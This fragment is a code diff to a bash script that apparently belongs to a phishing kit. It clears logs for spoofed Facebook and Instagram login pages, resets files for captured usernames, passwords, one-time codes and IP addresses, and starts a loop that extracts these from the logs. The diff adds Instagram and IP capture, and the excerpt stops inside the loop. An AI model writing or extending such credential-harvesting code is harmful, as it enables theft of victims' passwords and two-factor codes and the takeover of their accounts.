@@ -1,8 +1,10 @@
 #!/bin/bash
 printf "" > assets/sites/facebook/log.txt
+printf "" > assets/sites/instagram/log.txt
 printf ""> process/username.txt
 printf ""> process/password.txt
 printf ""> process/otp.txt
+printf ""> process/ip.txt
 while true; do
 ip=$(cat assets/sites/facebook/log.txt | grep 'IP:' | awk '{print $2}')
 username=$(cat assets/sites/facebook/log.txt | grep 'Username:' | awk '{print $2}')
